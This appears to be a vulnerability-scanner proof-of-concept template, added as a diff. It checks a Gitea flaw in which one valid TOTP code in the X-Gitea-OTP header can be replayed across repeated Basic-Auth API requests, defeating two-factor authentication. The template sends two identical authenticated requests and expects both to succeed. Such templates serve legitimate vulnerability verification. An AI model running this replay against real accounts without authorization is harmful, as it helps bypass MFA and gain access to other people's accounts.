@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "验证 Gitea Basic-Auth X-Gitea-OTP 路径缺少 TOTP 一次性使用校验（Defect 2）。同一有效 TOTP 验证码可重复用于多个 API 请求，完全绕过双因素认证。需提供有效 Gitea 账户凭据及当前有效的 TOTP 验证码。"
+id = "POC-AVE-2026-0246"
+name = "Gitea TOTP X-Gitea-OTP Header Replay PoC"
+severity = "high"
+tags = ["ave-2026-0246"]
+vuln_id = [
+    "CVE-2026-20779",
+    "AVE-2026-0246",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/user"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic {{base64(username:password)}}"
+X-Gitea-OTP = "{{totp}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/user"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic {{base64(username:password)}}"
+X-Gitea-OTP = "{{totp}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
